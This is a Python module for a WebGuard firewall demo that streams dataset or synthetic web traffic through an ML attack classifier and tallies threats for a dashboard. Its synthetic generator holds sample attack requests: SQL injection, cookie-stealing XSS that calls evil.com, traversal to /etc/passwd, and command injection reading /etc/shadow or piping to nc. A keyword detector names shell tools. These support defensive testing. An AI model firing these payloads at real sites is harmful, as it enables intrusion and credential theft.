import os
import re
import csv
import gzip
import time
import random
import threading
from collections import deque
from datetime import datetime
from .attack_service import attack_service
from .client_service import client_service
from .traffic_service import traffic_service

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
UPLOADS_DIR = os.path.abspath(os.path.join(BASE_DIR, "..", "uploads"))
DATA_DIR = os.path.abspath(os.path.join(BASE_DIR, "..", "..", "ml", "data"))
os.makedirs(UPLOADS_DIR, exist_ok=True)

class LiveMonitoringService:
    def __init__(self):
        self.lock = threading.Lock()
        self.is_running = False
        self.speed = 2  # events per second
        self.active_dataset_id = "unified_master"
        self.datasets = {}
        
        # In-memory circular buffers
        self.recent_events = deque(maxlen=100)
        self.timeline = deque(maxlen=30)  # last 30 time slices for rolling chart
        
        # Aggregate Counters
        self.total_processed = 0
        self.threats_detected = 0
        self.anomalies_flagged = 0
        self.normal_count = 0
        self.threat_breakdown = {
            "SQL Injection (SQLi)": 0,
            "Cross-Site Scripting (XSS)": 0,
            "Directory Path Traversal / LFI": 0,
            "OS Command Injection": 0,
            "Bot / Client Anomaly": 0,
            "Normal / Safe Traffic": 0
        }
        
        # Dataset items cursor
        self.dataset_items = []
        self.cursor = 0
        self.worker_thread = None
        
        # Initialize datasets
        self.refresh_datasets()
        self.load_dataset(self.active_dataset_id)

    def refresh_datasets(self):
        """Scans for available datasets (built-in + uploaded)."""
        self.datasets = {
            "unified_master": {
                "id": "unified_master",
                "name": "WebGuard Unified Master Dataset (All 32 Features)",
                "type": "unified",
                "description": "Comprehensive unified dataset combining Traffic Forecaster Lags, TSI, Client Sessions (RPM, Error Rate), and Attack Payloads.",
                "path": os.path.join(DATA_DIR, "webguard_unified_master_dataset.csv")
            },
            "csic_attacks": {
                "id": "csic_attacks",
                "name": "CSIC 2010 Web Traffic & Attack Payloads",
                "type": "built-in",
                "description": "15,000+ real HTTP requests including SQLi, XSS, Path Traversal, and normal traffic.",
                "path": os.path.join(DATA_DIR, "csic_2010.csv")
            },
            "ecommerce_stream": {
                "id": "ecommerce_stream",
                "name": "E-Commerce Live Website Traffic Feed",
                "type": "synthetic-live",
                "description": "Modern web store requests: cart, checkout, search, API calls, and scanner bots.",
                "path": None
            },
            "nasa_logs": {
                "id": "nasa_logs",
                "name": "NASA Kennedy Web Server Access Logs",
                "type": "built-in",
                "description": "Real web server access logs with diverse client IPs and asset requests.",
                "path": os.path.join(DATA_DIR, "NASA_access_log_Jul95.gz")
            }
        }

        # Check uploads directory
        if os.path.exists(UPLOADS_DIR):
            for fname in os.listdir(UPLOADS_DIR):
                if fname.endswith((".csv", ".log", ".txt")):
                    dataset_id = f"custom_{fname}"
                    self.datasets[dataset_id] = {
                        "id": dataset_id,
                        "name": f"Custom: {fname}",
                        "type": "uploaded",
                        "description": f"User-uploaded dataset file ({fname})",
                        "path": os.path.join(UPLOADS_DIR, fname)
                    }

    def load_dataset(self, dataset_id):
        with self.lock:
            self.active_dataset_id = dataset_id
            self.cursor = 0
            self.dataset_items = []

            meta = self.datasets.get(dataset_id)
            if not meta:
                meta = self.datasets.get("csic_attacks")
                self.active_dataset_id = "csic_attacks"

            # 1. E-Commerce generator
            if meta["id"] == "ecommerce_stream":
                self.dataset_items = self._generate_ecommerce_items(500)
                return

            # 2. File-based datasets
            path = meta.get("path")
            if not path or not os.path.exists(path):
                self.dataset_items = self._generate_ecommerce_items(500)
                return

            try:
                if path.endswith(".gz"):
                    # NASA log gz sample
                    with gzip.open(path, "rt", encoding="latin-1", errors="ignore") as f:
                        lines = [f.readline() for _ in range(1000)]
                    self.dataset_items = self._parse_apache_log_lines(lines)
                elif path.endswith(".csv"):
                    self.dataset_items = self._parse_csv_file(path)
                else:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        lines = f.readlines()[:1000]
                    self.dataset_items = self._parse_apache_log_lines(lines)
            except Exception as e:
                print(f"Error loading dataset {dataset_id}: {e}")
                self.dataset_items = self._generate_ecommerce_items(500)

    def _parse_csv_file(self, path):
        items = []
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                reader = csv.DictReader(f)
                for row in reader:
                    req_str = row.get("request_string") or row.get("payload") or row.get("request") or ""
                    if not req_str:
                        # Construct from columns if available
                        method = row.get("method", "GET")
                        url = row.get("url") or row.get("path") or "/"
                        ip = row.get("ip") or row.get("client_ip") or "192.168.1.50"
                        req_str = f"{method} {url} HTTP/1.1\nHost: mywebsite.com\nX-Forwarded-For: {ip}"
                    
                    traffic_surge_index = float(row["traffic_surge_index"]) if row.get("traffic_surge_index") else None
                    hourly_vol = float(row["hourly_traffic_volume"]) if row.get("hourly_traffic_volume") else None

                    items.append({
                        "request_string": req_str,
                        "client_ip": row.get("client_ip") or row.get("ip") or self._extract_ip(req_str),
                        "requests_per_min": float(row.get("requests_per_min", random.uniform(1.0, 20.0))),
                        "error_rate": float(row.get("error_rate", random.uniform(0.0, 0.05))),
                        "unique_urls": float(row.get("unique_urls", random.randint(2, 15))),
                        "traffic_surge_index": traffic_surge_index,
                        "hourly_traffic_volume": hourly_vol
                    })
                    if len(items) >= 5000:
                        break
        except Exception as e:
            print(f"Failed to parse CSV: {e}")
        return items if items else self._generate_ecommerce_items(200)

    def _parse_apache_log_lines(self, lines):
        # Format: 199.72.81.55 - - [01/Jul/1995:00:00:01 -0400] "GET /history/apollo/ HTTP/1.0" 200 6245
        log_pattern = re.compile(r'^(\S+) \S+ \S+ \[([^\]]+)\] "([A-Z]+) (\S+)(?: \S+)?" (\d{3}) (\S+)')
        items = []
        for line in lines:
            m = log_pattern.match(line.strip())
            if m:
                ip, ts, method, path, status, size = m.groups()
                req_str = f"{method} {path} HTTP/1.1\nHost: webguard.local\nX-Forwarded-For: {ip}\nUser-Agent: Mozilla/5.0"
                items.append({
                    "request_string": req_str,
                    "client_ip": ip,
                    "requests_per_min": random.uniform(1.0, 15.0),
                    "error_rate": 0.5 if status.startswith(("4", "5")) else 0.0,
                    "unique_urls": random.randint(1, 8)
                })
        return items if items else self._generate_ecommerce_items(200)

    def _generate_ecommerce_items(self, count=500):
        endpoints = [
            "/api/v1/products", "/cart/add", "/checkout/pay", "/search?q=laptop",
            "/api/v1/user/profile", "/login", "/category/electronics", "/static/logo.png",
            "/api/v1/reviews?product_id=45", "/catalog/featured", "/terms-of-service"
        ]
        attacks = [
            ("GET /search?q=test' OR 1=1-- HTTP/1.1\nHost: mystore.com", "SQL Injection (SQLi)"),
            ("GET /product?id=1 UNION SELECT null,username,password FROM users-- HTTP/1.1\nHost: mystore.com", "SQL Injection (SQLi)"),
            ("GET /comment?text=<script>alert('XSS')</script> HTTP/1.1\nHost: mystore.com", "Cross-Site Scripting (XSS)"),
            ("GET /avatar?img=<img src=x onerror=fetch('http://evil.com/'+document.cookie)> HTTP/1.1\nHost: mystore.com", "Cross-Site Scripting (XSS)"),
            ("GET /download?file=../../../../etc/passwd HTTP/1.1\nHost: mystore.com", "Directory Path Traversal / LFI"),
            ("GET /view?page=..\\..\\windows\\win.ini HTTP/1.1\nHost: mystore.com", "Directory Path Traversal / LFI"),
            ("POST /admin/ping HTTP/1.1\nHost: mystore.com\n\nip=127.0.0.1; cat /etc/shadow", "OS Command Injection"),
            ("GET /exec?cmd=whoami|nc 10.0.0.1 4444 HTTP/1.1\nHost: mystore.com", "OS Command Injection"),
        ]
        
        items = []
        for i in range(count):
            client_ip = f"{random.randint(24, 212)}.{random.randint(10, 250)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            
            # 15% probability of attack or anomaly
            is_malicious = (random.random() < 0.15)
            is_bot = (random.random() < 0.08)
            
            if is_malicious:
                payload_template, atk_type = random.choice(attacks)
                req_str = f"{payload_template}\nX-Forwarded-For: {client_ip}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                rpm = random.uniform(25.0, 80.0) if is_bot else random.uniform(2.0, 15.0)
                err = random.uniform(0.15, 0.45)
                uniq = random.randint(1, 5)
            elif is_bot:
                url = random.choice(endpoints)
                req_str = f"GET {url} HTTP/1.1\nHost: mystore.com\nX-Forwarded-For: {client_ip}\nUser-Agent: Python-requests/2.31.0 ScraperBot/1.0"
                rpm = random.uniform(55.0, 140.0)
                err = random.uniform(0.05, 0.20)
                uniq = random.randint(30, 80)
            else:
                method = "POST" if "/cart" in endpoints[i % len(endpoints)] or "/checkout" in endpoints[i % len(endpoints)] else "GET"
                url = random.choice(endpoints)
                req_str = f"{method} {url} HTTP/1.1\nHost: mystore.com\nX-Forwarded-For: {client_ip}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
                rpm = random.uniform(1.0, 12.0)
                err = random.uniform(0.0, 0.02)
                uniq = random.randint(2, 10)

            items.append({
                "request_string": req_str,
                "client_ip": client_ip,
                "requests_per_min": rpm,
                "error_rate": err,
                "unique_urls": uniq
            })
        return items

    def _extract_ip(self, req_str):
        ip_m = re.search(r'(?:X-Forwarded-For|Host):\s*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)', req_str, re.I)
        if ip_m:
            return ip_m.group(1)
        ip_any = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', req_str)
        return ip_any.group(0) if ip_any else f"192.168.1.{random.randint(10, 250)}"

    def _extract_path_and_method(self, req_str):
        first_line = req_str.strip().split("\n")[0]
        parts = first_line.split(" ")
        method = parts[0] if parts and parts[0] else "GET"
        path = parts[1] if len(parts) > 1 else "/"
        return method, path

    def _determine_threat_category(self, req_str, is_threat, client_res):
        req_lower = req_str.lower()
        if any(k in req_lower for k in ["select", "union", "insert", "delete", "drop", "1=1", "sleep", "--", "information_schema"]):
            return "SQL Injection (SQLi)"
        elif any(k in req_lower for k in ["<script", "alert(", "onerror", "onload", "javascript:", "eval(", "svg"]):
            return "Cross-Site Scripting (XSS)"
        elif any(k in req_lower for k in ["etc/passwd", "win.ini", "boot.ini", "..", "../"]):
            return "Directory Path Traversal / LFI"
        elif any(k in req_lower for k in ["whoami", "cmd=", "; rm", "cat /", "| nc", "bin/sh"]):
            return "OS Command Injection"
        elif client_res.get("is_anomaly"):
            return "Bot / Client Anomaly"
        elif is_threat:
            return "Suspicious Exploit Payload"
        return "Normal / Safe Traffic"

    def process_request(self, raw_data):
        """Processes a single incoming HTTP request through the full WebGuard ML core."""
        t0 = time.time()
        req_str = raw_data.get("request_string") or "GET / HTTP/1.1\nHost: website.com"
        client_ip = raw_data.get("client_ip") or self._extract_ip(req_str)
        method, path = self._extract_path_and_method(req_str)

        rpm = float(raw_data.get("requests_per_min", 8.0))
        err = float(raw_data.get("error_rate", 0.01))
        uniq = float(raw_data.get("unique_urls", 5.0))
        
        # Calculate or use pre-computed TSI
        if "traffic_surge_index" in raw_data and raw_data["traffic_surge_index"] is not None:
            live_tsi = float(raw_data["traffic_surge_index"])
        else:
            live_tsi = min(1.0, max(0.0, (rpm - 10.0) / 40.0))

        analysis = attack_service.analyze({
            "request_string": req_str,
            "requests_per_min": rpm,
            "error_rate": err,
            "unique_urls": uniq,
            "traffic_surge_index": live_tsi
        })
        
        latency_ms = round((time.time() - t0) * 1000.0, 2)
        is_threat = analysis["is_threat"]
        client_anomaly = analysis.get("client_analysis", {}).get("is_anomaly", False)
        
        threat_type = self._determine_threat_category(req_str, is_threat, analysis.get("client_analysis", {}))

        event = {
            "id": f"evt_{int(time.time()*1000)}_{random.randint(100, 999)}",
            "timestamp": datetime.now().strftime("%H:%M:%S"),
            "client_ip": client_ip,
            "method": method,
            "path": path,
            "request_string": req_str,
            "attack_type": threat_type,
            "attack_probability": analysis["attack_probability"],
            "behavior_score": analysis["behavior_score"],
            "traffic_surge_index": analysis["traffic_surge_index"],
            "risk_score": analysis["risk_score"],
            "is_threat": is_threat,
            "is_client_anomaly": client_anomaly,
            "latency_ms": latency_ms,
            "llm_report": analysis.get("llm_report", "")
        }

        with self.lock:
            self.total_processed += 1
            if is_threat:
                self.threats_detected += 1
            else:
                self.normal_count += 1
            if client_anomaly:
                self.anomalies_flagged += 1
            
            if threat_type in self.threat_breakdown:
                self.threat_breakdown[threat_type] += 1
            else:
                self.threat_breakdown[threat_type] = 1

            self.recent_events.appendleft(event)
            self._update_timeline()

        return event

    def _update_timeline(self):
        """Updates rolling timeline data points for UI charts."""
        curr_time = datetime.now().strftime("%H:%M:%S")
        # Find if this second already exists
        if self.timeline and self.timeline[-1]["time"] == curr_time:
            self.timeline[-1]["total"] += 1
            if self.recent_events and self.recent_events[0]["is_threat"]:
                self.timeline[-1]["threats"] += 1
            else:
                self.timeline[-1]["normal"] += 1
        else:
            is_threat = self.recent_events[0]["is_threat"] if self.recent_events else False
            self.timeline.append({
                "time": curr_time,
                "total": 1,
                "threats": 1 if is_threat else 0,
                "normal": 0 if is_threat else 1,
                "tsi": self.recent_events[0]["traffic_surge_index"] if self.recent_events else 0.0
            })

    def _worker_loop(self):
        """Background thread streaming requests at the chosen speed."""
        while self.is_running:
            item = None
            with self.lock:
                if not self.dataset_items:
                    self.dataset_items = self._generate_ecommerce_items(300)
                
                item = self.dataset_items[self.cursor % len(self.dataset_items)]
                self.cursor += 1

            if item:
                self.process_request(item)

            sleep_time = max(0.05, 1.0 / max(1, self.speed))
            time.sleep(sleep_time)

    def start_stream(self, dataset_id=None, speed=None):
        with self.lock:
            if dataset_id and dataset_id != self.active_dataset_id:
                self.load_dataset(dataset_id)
            if speed:
                self.speed = int(speed)

            if not self.is_running:
                self.is_running = True
                self.worker_thread = threading.Thread(target=self._worker_loop, daemon=True)
                self.worker_thread.start()

    def pause_stream(self):
        with self.lock:
            self.is_running = False

    def reset_stream(self):
        with self.lock:
            self.is_running = False
            self.cursor = 0
            self.recent_events.clear()
            self.timeline.clear()
            self.total_processed = 0
            self.threats_detected = 0
            self.anomalies_flagged = 0
            self.normal_count = 0
            for k in self.threat_breakdown:
                self.threat_breakdown[k] = 0

    def get_state(self):
        with self.lock:
            current_tsi = self.recent_events[0]["traffic_surge_index"] if self.recent_events else 0.0
            threat_rate = round((self.threats_detected / max(1, self.total_processed)) * 100, 1)
            
            return {
                "is_running": self.is_running,
                "speed": self.speed,
                "active_dataset_id": self.active_dataset_id,
                "available_datasets": list(self.datasets.values()),
                "kpis": {
                    "total_processed": self.total_processed,
                    "threats_detected": self.threats_detected,
                    "anomalies_flagged": self.anomalies_flagged,
                    "normal_count": self.normal_count,
                    "threat_rate_percent": threat_rate,
                    "current_rps": self.speed if self.is_running else 0,
                    "current_tsi": current_tsi,
                    "total_dataset_items": len(self.dataset_items),
                    "cursor": self.cursor
                },
                "threat_breakdown": self.threat_breakdown,
                "timeline": list(self.timeline),
                "recent_events": list(self.recent_events)[:50]
            }

live_service = LiveMonitoringService()
